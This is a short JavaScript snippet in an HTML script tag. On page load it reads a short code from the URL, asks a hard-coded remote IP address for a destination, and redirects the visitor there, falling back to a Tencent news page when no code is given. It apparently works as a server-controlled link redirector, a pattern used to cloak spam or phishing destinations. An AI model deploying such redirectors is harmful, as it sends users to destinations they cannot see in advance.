<script type="text/javascript" charset="utf-8" >

window.onload = function () {
var str = location.href
var num = str.indexOf("?");
var i = str.substr(num + 1,5);
var i =decodeURIComponent(i)
    if (i) {
        const httpRequest = new XMLHttpRequest();
        httpRequest.open("get", "http://182.92.232.94:8100/query.php");
        httpRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        httpRequest.send("id=" + i);
        httpRequest.onreadystatechange = function () {
            if (httpRequest.readyState === 4 && httpRequest.status === 200) {
                self.location.href = httpRequest.responseText;
            }
        }
    }else {
        self.location.href = "http://xw.qq.com";
    }
    
}
</script>
